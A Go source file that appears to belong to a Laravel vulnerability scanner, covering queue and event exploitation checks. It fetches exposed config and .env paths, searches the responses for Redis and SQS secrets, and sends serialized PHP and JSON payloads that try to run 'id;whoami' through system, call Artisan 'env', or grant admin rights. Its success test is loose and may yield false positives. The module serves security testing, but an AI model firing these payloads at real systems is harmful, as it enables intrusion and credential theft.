package vulnerabilities

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"laravelmap/internal/common"
	"laravelmap/pkg/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// QueueExploitationScanner is a struct that contains an HTTP client for detecting Laravel queue exploitation vulnerabilities
type QueueExploitationScanner struct {
	client *httpclient.Client
}

// NewQueueExploitationScanner initializes and returns a new QueueExploitationScanner instance
func NewQueueExploitationScanner() *QueueExploitationScanner {
	return &QueueExploitationScanner{
		client: httpclient.NewClient(15 * time.Second),
	}
}

// Run checks for Laravel queue exploitation vulnerabilities
func (qes *QueueExploitationScanner) Run(target string) []common.ScanResult {
	var results []common.ScanResult

	// Check for queue configuration exposure
	queueConfigResults := qes.checkQueueConfigExposure(target)
	results = append(results, queueConfigResults...)

	// Check for job serialization/deserialization vulnerabilities
	jobSerializationResults := qes.checkJobSerializationVulnerabilities(target)
	results = append(results, jobSerializationResults...)

	// Check for queue worker vulnerabilities
	queueWorkerResults := qes.checkQueueWorkerVulnerabilities(target)
	results = append(results, queueWorkerResults...)

	// Check for queue event injection
	queueEventResults := qes.checkQueueEventInjection(target)
	results = append(results, queueEventResults...)

	// If no vulnerabilities were detected
	if len(results) == 0 {
		results = append(results, common.ScanResult{
			ScanName:    qes.Name(),
			Category:    "Vulnerabilities",
			Description: "No Laravel queue exploitation vulnerabilities detected",
			Path:        target,
			StatusCode:  0,
			Detail:      "No potential Laravel queue exploitation vulnerabilities were detected. However, this does not guarantee that the application is not vulnerable to queue-related attacks.",
		})
	}

	return results
}

// checkQueueConfigExposure checks for exposed queue configuration
func (qes *QueueExploitationScanner) checkQueueConfigExposure(target string) []common.ScanResult {
	var results []common.ScanResult

	// Common paths that might expose queue configuration
	configPaths := []string{
		"/config/queue.php",
		"/app/config/queue.php",
		"/storage/logs/laravel.log",
		"/storage/logs/queue.log",
		"/storage/logs/worker.log",
		"/.env",
	}

	for _, path := range configPaths {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = path
		fullURL := parsedURL.String()

		// Send GET request
		resp, err := qes.client.Get(fullURL, nil)
		if err != nil {
			continue
		}

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check if the response contains queue configuration information
		if resp.StatusCode == 200 && qes.containsQueueConfig(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    qes.Name(),
				Category:    "Vulnerabilities",
				Description: "Laravel queue configuration exposure",
				Path:        fullURL,
				StatusCode:  resp.StatusCode,
				Detail:      fmt.Sprintf("The application exposes queue configuration at %s. This could reveal sensitive information such as queue connection details, credentials, and worker configuration.", fullURL),
			})
		}
	}

	return results
}

// containsQueueConfig checks if the response contains queue configuration information
func (qes *QueueExploitationScanner) containsQueueConfig(response string) bool {
	queueConfigPatterns := []string{
		"QUEUE_CONNECTION",
		"QUEUE_DRIVER",
		"REDIS_HOST",
		"REDIS_PASSWORD",
		"REDIS_PORT",
		"REDIS_QUEUE",
		"SQS_KEY",
		"SQS_SECRET",
		"SQS_PREFIX",
		"SQS_QUEUE",
		"SQS_REGION",
		"BEANSTALKD_HOST",
		"BEANSTALKD_QUEUE",
		"connection => redis",
		"connection => database",
		"connection => sqs",
		"connection => beanstalkd",
		"driver => redis",
		"driver => database",
		"driver => sqs",
		"driver => beanstalkd",
		"'driver' => 'sync'",
		"'driver' => 'redis'",
		"'driver' => 'database'",
		"'driver' => 'sqs'",
		"'driver' => 'beanstalkd'",
	}

	for _, pattern := range queueConfigPatterns {
		if strings.Contains(response, pattern) {
			return true
		}
	}

	return false
}

// checkJobSerializationVulnerabilities checks for job serialization/deserialization vulnerabilities
func (qes *QueueExploitationScanner) checkJobSerializationVulnerabilities(target string) []common.ScanResult {
	var results []common.ScanResult

	// Find potential job dispatch endpoints
	jobEndpoints := qes.findJobDispatchEndpoints(target)

	// Prepare serialization payloads
	serializationPayloads := []struct {
		name  string
		value string
	}{
		{
			name:  "PHP Object Injection",
			value: "O:26:\"Illuminate\\Queue\\CallQueuedHandler\":1:{s:5:\"class\";s:28:\"Illuminate\\Support\\Facades\\App\";s:6:\"method\";s:6:\"system\";s:10:\"parameters\";a:1:{i:0;s:9:\"id;whoami\";}}",
		},
		{
			name:  "Unserialize Payload",
			value: "a:2:{s:5:\"class\";s:28:\"Illuminate\\Support\\Facades\\App\";s:6:\"method\";s:6:\"system\";s:10:\"parameters\";a:1:{i:0;s:9:\"id;whoami\";}}",
		},
		{
			name:  "Base64 Encoded Payload",
			value: "TzoyNjoiSWxsdW1pbmF0ZVxRdWV1ZVxDYWxsUXVldWVkSGFuZGxlciI6MTp7czo1OiJjbGFzcyI7czoyODoiSWxsdW1pbmF0ZVxTdXBwb3J0XEZhY2FkZXNcQXBwIjtzOjY6Im1ldGhvZCI7czo2OiJzeXN0ZW0iO3M6MTA6InBhcmFtZXRlcnMiO2E6MTp7aTowO3M6OToiaWQ7d2hvYW1pIjt9fQ==",
		},
	}

	// Test each endpoint with serialization payloads
	for _, endpoint := range jobEndpoints {
		for _, payload := range serializationPayloads {
			// Create the full URL
			fullURL := endpoint
			if !strings.HasPrefix(endpoint, "http") {
				parsedURL, parseErr := url.Parse(target)
				if parseErr != nil {
					continue
				}

				parsedURL.Path = endpoint
				fullURL = parsedURL.String()
			}

			// Create form data with the payload
			formData := url.Values{}
			formData.Set("job", payload.value)
			formData.Set("data", payload.value)
			formData.Set("payload", payload.value)
			formData.Set("command", payload.value)

			// Send POST request
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			}
			resp, err := qes.client.Post(fullURL, headers, strings.NewReader(formData.Encode()))
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a successful exploitation
			if qes.checkResponseForExploitation(bodyString) {
				results = append(results, common.ScanResult{
					ScanName:    qes.Name(),
					Category:    "Vulnerabilities",
					Description: fmt.Sprintf("Potential Laravel queue job serialization vulnerability (%s)", payload.name),
					Path:        fullURL,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The endpoint %s might be vulnerable to Laravel queue job serialization attacks. The application accepted a potentially malicious serialized job payload.", fullURL),
				})

				// Break the loop for this endpoint to avoid duplicate results
				break
			}
		}

		// Also test with JSON payloads
		jsonPayloads := []struct {
			name  string
			value string
		}{
			{
				name:  "Command Injection JSON",
				value: `{"job":"Illuminate\\Queue\\CallQueuedHandler","data":{"command":"system","parameters":["id;whoami"]}}`,
			},
			{
				name:  "Artisan Command JSON",
				value: `{"job":"Illuminate\\Queue\\CallQueuedCommand","data":{"command":"env","parameters":[]}}`,
			},
		}

		for _, payload := range jsonPayloads {
			// Create the full URL
			fullURL := endpoint
			if !strings.HasPrefix(endpoint, "http") {
				parsedURL, parseErr := url.Parse(target)
				if parseErr != nil {
					continue
				}

				parsedURL.Path = endpoint
				fullURL = parsedURL.String()
			}

			// Send POST request with JSON payload
			headers := map[string]string{
				"Content-Type": "application/json",
				"Accept":       "application/json",
			}
			resp, err := qes.client.Post(fullURL, headers, strings.NewReader(payload.value))
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a successful exploitation
			if qes.checkResponseForExploitation(bodyString) {
				results = append(results, common.ScanResult{
					ScanName:    qes.Name(),
					Category:    "Vulnerabilities",
					Description: fmt.Sprintf("Potential Laravel queue job JSON injection vulnerability (%s)", payload.name),
					Path:        fullURL,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The endpoint %s might be vulnerable to Laravel queue job JSON injection attacks. The application accepted a potentially malicious JSON job payload.", fullURL),
				})

				// Break the loop for this endpoint to avoid duplicate results
				break
			}
		}
	}

	return results
}

// findJobDispatchEndpoints finds potential job dispatch endpoints
func (qes *QueueExploitationScanner) findJobDispatchEndpoints(target string) []string {
	var endpoints []string

	// Common job dispatch endpoints
	commonEndpoints := []string{
		"/queue/work",
		"/queue/process",
		"/queue/dispatch",
		"/jobs/dispatch",
		"/jobs/process",
		"/api/queue/dispatch",
		"/api/jobs/dispatch",
		"/api/queue/process",
		"/api/jobs/process",
	}

	// Add common endpoints
	endpoints = append(endpoints, commonEndpoints...)

	// Send a GET request to the target
	resp, err := qes.client.Get(target, nil)
	if err != nil {
		return endpoints
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return endpoints
	}
	bodyString := string(bodyBytes)

	// Extract potential job dispatch endpoints from JavaScript files
	jsPattern := `<script[^>]*src="([^"]*\.js)"[^>]*>`
	jsRegex := regexp.MustCompile(jsPattern)
	jsMatches := jsRegex.FindAllStringSubmatch(bodyString, -1)

	for _, jsMatch := range jsMatches {
		if len(jsMatch) < 2 {
			continue
		}

		jsURL := jsMatch[1]
		if !strings.HasPrefix(jsURL, "http") {
			// Convert relative URL to absolute
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			if strings.HasPrefix(jsURL, "/") {
				// Absolute path
				parsedURL.Path = jsURL
			} else {
				// Relative path
				if !strings.HasSuffix(parsedURL.Path, "/") {
					parsedURL.Path += "/"
				}
				parsedURL.Path += jsURL
			}

			jsURL = parsedURL.String()
		}

		// Get the JavaScript file
		jsResp, jsErr := qes.client.Get(jsURL, nil)
		if jsErr != nil {
			continue
		}

		jsBodyBytes, jsErr := ioutil.ReadAll(jsResp.Body)
		jsResp.Body.Close()
		if jsErr != nil {
			continue
		}
		jsBodyString := string(jsBodyBytes)

		// Extract potential job dispatch endpoints from JavaScript
		jobPatterns := []string{
			`dispatch\(['"]([^'"]+)['"]`,
			`queue\.push\(['"]([^'"]+)['"]`,
			`job\.dispatch\(['"]([^'"]+)['"]`,
			`url:\s*['"]([^'"]*(?:queue|job|dispatch)[^'"]*)['"]\s*`,
		}

		for _, pattern := range jobPatterns {
			jobRegex := regexp.MustCompile(pattern)
			jobMatches := jobRegex.FindAllStringSubmatch(jsBodyString, -1)

			for _, jobMatch := range jobMatches {
				if len(jobMatch) < 2 {
					continue
				}

				endpoint := jobMatch[1]
				if !strings.HasPrefix(endpoint, "http") && !strings.HasPrefix(endpoint, "/") {
					endpoint = "/" + endpoint
				}

				endpoints = append(endpoints, endpoint)
			}
		}
	}

	return endpoints
}

// checkResponseForExploitation checks if the response indicates a successful exploitation
func (qes *QueueExploitationScanner) checkResponseForExploitation(response string) bool {
	// Check for common success indicators
	successPatterns := []string{
		"job has been dispatched",
		"job has been pushed",
		"job has been queued",
		"successfully queued",
		"successfully dispatched",
		"successfully pushed",
		"job_id",
		"queue_name",
		"job has been",
		"\"success\"",
		"\"status\":\"success\"",
		"\"status\":\"ok\"",
	}

	for _, pattern := range successPatterns {
		if strings.Contains(strings.ToLower(response), strings.ToLower(pattern)) {
			return true
		}
	}

	// Check if the response is a JSON object with success indicators
	var jsonResponse map[string]interface{}
	if err := json.Unmarshal([]byte(response), &jsonResponse); err == nil {
		// Check for success status
		if status, ok := jsonResponse["status"]; ok {
			if statusStr, ok := status.(string); ok {
				if statusStr == "success" || statusStr == "ok" {
					return true
				}
			}
		}

		// Check for job ID
		if _, ok := jsonResponse["job_id"]; ok {
			return true
		}

		// Check for queue name
		if _, ok := jsonResponse["queue_name"]; ok {
			return true
		}
	}

	return false
}

// checkQueueWorkerVulnerabilities checks for queue worker vulnerabilities
func (qes *QueueExploitationScanner) checkQueueWorkerVulnerabilities(target string) []common.ScanResult {
	var results []common.ScanResult

	// Common paths that might expose queue worker information
	workerPaths := []string{
		"/queue/status",
		"/queue/workers",
		"/queue/failed",
		"/queue/retry",
		"/horizon/api/jobs/recent",
		"/horizon/api/jobs/failed",
		"/horizon/api/jobs/pending",
		"/horizon/api/jobs/completed",
		"/horizon/api/metrics/jobs",
		"/horizon/api/metrics/queues",
	}

	for _, path := range workerPaths {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = path
		fullURL := parsedURL.String()

		// Send GET request
		resp, err := qes.client.Get(fullURL, nil)
		if err != nil {
			continue
		}

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check if the response contains queue worker information
		if resp.StatusCode == 200 && qes.containsQueueWorkerInfo(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    qes.Name(),
				Category:    "Vulnerabilities",
				Description: "Laravel queue worker information exposure",
				Path:        fullURL,
				StatusCode:  resp.StatusCode,
				Detail:      fmt.Sprintf("The application exposes queue worker information at %s. This could reveal sensitive information about the queue system, job payloads, and worker configuration.", fullURL),
			})
		}
	}

	return results
}

// containsQueueWorkerInfo checks if the response contains queue worker information
func (qes *QueueExploitationScanner) containsQueueWorkerInfo(response string) bool {
	workerInfoPatterns := []string{
		"worker_id",
		"worker_name",
		"worker_status",
		"worker_pid",
		"queue_name",
		"job_id",
		"job_name",
		"job_payload",
		"job_status",
		"failed_jobs",
		"pending_jobs",
		"completed_jobs",
		"horizon_status",
		"supervisor_status",
		"\"type\":\"job\"",
		"\"status\":\"pending\"",
		"\"status\":\"processing\"",
		"\"status\":\"failed\"",
		"\"status\":\"completed\"",
	}

	for _, pattern := range workerInfoPatterns {
		if strings.Contains(response, pattern) {
			return true
		}
	}

	// Check if the response is a JSON array or object with worker information
	if strings.HasPrefix(strings.TrimSpace(response), "[") || strings.HasPrefix(strings.TrimSpace(response), "{") {
		// Try to parse as JSON array
		var jsonArray []map[string]interface{}
		if err := json.Unmarshal([]byte(response), &jsonArray); err == nil && len(jsonArray) > 0 {
			// Check first item for worker info keys
			for _, item := range jsonArray {
				for _, pattern := range []string{"worker", "job", "queue", "payload", "status"} {
					for key := range item {
						if strings.Contains(strings.ToLower(key), pattern) {
							return true
						}
					}
				}
			}
		}

		// Try to parse as JSON object
		var jsonObject map[string]interface{}
		if err := json.Unmarshal([]byte(response), &jsonObject); err == nil {
			// Check for worker info keys
			for _, pattern := range []string{"worker", "job", "queue", "payload", "status"} {
				for key := range jsonObject {
					if strings.Contains(strings.ToLower(key), pattern) {
						return true
					}
				}
			}
		}
	}

	return false
}

// checkQueueEventInjection checks for queue event injection vulnerabilities
func (qes *QueueExploitationScanner) checkQueueEventInjection(target string) []common.ScanResult {
	var results []common.ScanResult

	// Find potential event dispatch endpoints
	eventEndpoints := qes.findEventDispatchEndpoints(target)

	// Prepare event injection payloads
	eventPayloads := []struct {
		name  string
		value string
	}{
		{
			name:  "Command Execution Event",
			value: `{"event":"Illuminate\\Events\\CallQueuedListener","data":{"class":"Illuminate\\Support\\Facades\\Artisan","method":"call","data":["env"]}}`,
		},
		{
			name:  "System Command Event",
			value: `{"event":"Illuminate\\Events\\CallQueuedListener","data":{"class":"Illuminate\\Support\\Facades\\App","method":"system","data":["id"]}}`,
		},
		{
			name:  "Malicious Event Listener",
			value: `{"event":"App\\Events\\UserRegistered","data":{"email":"attacker@example.com","admin":true,"role":"admin"}}`,
		},
	}

	// Test each endpoint with event injection payloads
	for _, endpoint := range eventEndpoints {
		for _, payload := range eventPayloads {
			// Create the full URL
			fullURL := endpoint
			if !strings.HasPrefix(endpoint, "http") {
				parsedURL, parseErr := url.Parse(target)
				if parseErr != nil {
					continue
				}

				parsedURL.Path = endpoint
				fullURL = parsedURL.String()
			}

			// Send POST request with JSON payload
			headers := map[string]string{
				"Content-Type": "application/json",
				"Accept":       "application/json",
			}
			resp, err := qes.client.Post(fullURL, headers, strings.NewReader(payload.value))
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a successful exploitation
			if qes.checkResponseForExploitation(bodyString) {
				results = append(results, common.ScanResult{
					ScanName:    qes.Name(),
					Category:    "Vulnerabilities",
					Description: fmt.Sprintf("Potential Laravel queue event injection vulnerability (%s)", payload.name),
					Path:        fullURL,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The endpoint %s might be vulnerable to Laravel queue event injection attacks. The application accepted a potentially malicious event payload.", fullURL),
				})

				// Break the loop for this endpoint to avoid duplicate results
				break
			}
		}
	}

	return results
}

// findEventDispatchEndpoints finds potential event dispatch endpoints
func (qes *QueueExploitationScanner) findEventDispatchEndpoints(target string) []string {
	var endpoints []string

	// Common event dispatch endpoints
	commonEndpoints := []string{
		"/events/dispatch",
		"/event/dispatch",
		"/broadcast/auth",
		"/broadcasting/auth",
		"/api/events/dispatch",
		"/api/event/dispatch",
		"/api/broadcast/auth",
		"/api/broadcasting/auth",
	}

	// Add common endpoints
	endpoints = append(endpoints, commonEndpoints...)

	// Send a GET request to the target
	resp, err := qes.client.Get(target, nil)
	if err != nil {
		return endpoints
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return endpoints
	}
	bodyString := string(bodyBytes)

	// Extract potential event dispatch endpoints from JavaScript files
	jsPattern := `<script[^>]*src="([^"]*\.js)"[^>]*>`
	jsRegex := regexp.MustCompile(jsPattern)
	jsMatches := jsRegex.FindAllStringSubmatch(bodyString, -1)

	for _, jsMatch := range jsMatches {
		if len(jsMatch) < 2 {
			continue
		}

		jsURL := jsMatch[1]
		if !strings.HasPrefix(jsURL, "http") {
			// Convert relative URL to absolute
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			if strings.HasPrefix(jsURL, "/") {
				// Absolute path
				parsedURL.Path = jsURL
			} else {
				// Relative path
				if !strings.HasSuffix(parsedURL.Path, "/") {
					parsedURL.Path += "/"
				}
				parsedURL.Path += jsURL
			}

			jsURL = parsedURL.String()
		}

		// Get the JavaScript file
		jsResp, jsErr := qes.client.Get(jsURL, nil)
		if jsErr != nil {
			continue
		}

		jsBodyBytes, jsErr := ioutil.ReadAll(jsResp.Body)
		jsResp.Body.Close()
		if jsErr != nil {
			continue
		}
		jsBodyString := string(jsBodyBytes)

		// Extract potential event dispatch endpoints from JavaScript
		eventPatterns := []string{
			`event\.dispatch\(['"]([^'"]+)['"]`,
			`events\.dispatch\(['"]([^'"]+)['"]`,
			`broadcast\(['"]([^'"]+)['"]`,
			`Echo\.channel\(['"]([^'"]+)['"]`,
			`Echo\.private\(['"]([^'"]+)['"]`,
			`Echo\.presence\(['"]([^'"]+)['"]`,
			`url:\s*['"]([^'"]*(?:event|broadcast)[^'"]*)['"]\s*`,
		}

		for _, pattern := range eventPatterns {
			eventRegex := regexp.MustCompile(pattern)
			eventMatches := eventRegex.FindAllStringSubmatch(jsBodyString, -1)

			for _, eventMatch := range eventMatches {
				if len(eventMatch) < 2 {
					continue
				}

				endpoint := eventMatch[1]
				if !strings.HasPrefix(endpoint, "http") && !strings.HasPrefix(endpoint, "/") {
					endpoint = "/" + endpoint
				}

				endpoints = append(endpoints, endpoint)
			}
		}
	}

	return endpoints
}

// Name returns the name of the scanner
func (qes *QueueExploitationScanner) Name() string {
	return "Laravel Queue Exploitation Scanner"
}
